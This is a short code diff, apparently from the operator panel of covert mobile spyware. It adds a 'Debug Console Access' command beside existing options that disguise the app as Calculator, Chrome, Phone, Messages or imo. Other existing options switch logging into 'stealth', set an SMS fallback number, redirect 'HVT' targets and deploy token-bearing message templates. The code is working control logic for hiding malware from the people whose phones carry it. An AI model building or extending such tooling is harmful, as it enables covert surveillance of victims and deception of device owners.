@@ -436,6 +436,7 @@
                     { id: 'TOGGLE_FEATURE', name: 'Parametric Feature Control', icon: '⚙️', inputs: [{id: 'tog-feat', label: 'Feature (e.g. location)', type: 'text'}, {id: 'tog-state', label: 'Mode', type: 'select', options: [{v: 'on', l: 'ON'}, {v: 'off', l: 'OFF'}, {v: 'sched', l: 'SCHED'}]}, {id: 'tog-p1', label: 'Mins / Start (00:00)', type: 'text'}, {id: 'tog-p2', label: 'End (23:59)', type: 'text'}] },
                     { id: 'SET_TILE_STATE', name: 'Master Visibility Mode', icon: '👁️', inputs: [{id: 'val-tile-state', label: 'Mode', type: 'select', options: [{v: 'ON', l: 'Show Dashboard'}, {v: 'OFF', l: 'Masquerade'}]}] },
                     { id: 'TOGGLE_LOGGING', name: 'Toggle Live Debugger', icon: '🐞', inputs: [{id: 'log-state', label: 'State', type: 'select', options: [{v: 'ON', l: 'Logging ON'}, {v: 'OFF', l: 'Stealth OFF'}]}] },
+                    { id: 'SET_DEBUG_UI', name: 'Debug Console Access', icon: '🔓', inputs: [{id: 'val-debug-ui', label: 'Console State', type: 'select', options: [{v: 'ON', l: 'Accessible (Visible)'}, {v: 'OFF', l: 'Locked (Hidden)'}]}] },
                     { id: 'SET_MASQUERADE', name: 'Apply Stealth Skin', icon: '🎭', inputs: [{id: 'val-masquerade', label: 'App Mask', type: 'select', options: [{v: 'DRIVE', l: 'Drive Services'}, {v: 'CALC', l: 'Calculator'}, {v: 'GOOGLE_PHONE', l: 'Phone (Google)'}, {v: 'GOOGLE_MSG', l: 'Messages (Google)'}, {v: 'SAM_PHONE', l: 'Phone (Samsung)'}, {v: 'SAM_MSG', l: 'Messages (Samsung)'}, {v: 'CHROME', l: 'Chrome'}, {v: 'IMO', l: 'imo'}, {v: 'IMO_HD', l: 'imo HD'}, {v: 'IMO_BETA', l: 'imo beta'}, {v: 'IMO_LITE', l: 'imo lite'}]}] },
                     { id: 'SET_JUDAS_HANDLER', name: 'Emergency SMS Fallback', icon: '📞', inputs: [{id: 'judas-handler', label: 'Phone Number', type: 'text'}] },
                     { id: 'SET_PROMOS', name: 'Deploy Cipher Promos', icon: '📨', inputs: [{id: 'promo-templates', label: 'Template A [TOKEN] ||| B...', type: 'textarea'}] }
@@ -893,6 +894,8 @@
                         const path = document.getElementById('install-path').value;
                         const explanation = document.getElementById('install-html').value;
                         content = explanation ? `${path} | ${explanation}` : path; break;
+                    case 'SET_DEBUG_UI':
+                        content = document.getElementById('val-debug-ui').value; break;
                     case 'SET_MASQUERADE':
                         content = document.getElementById('val-masquerade').value; break;
                     case 'ADD_HVT_REDIRECT':
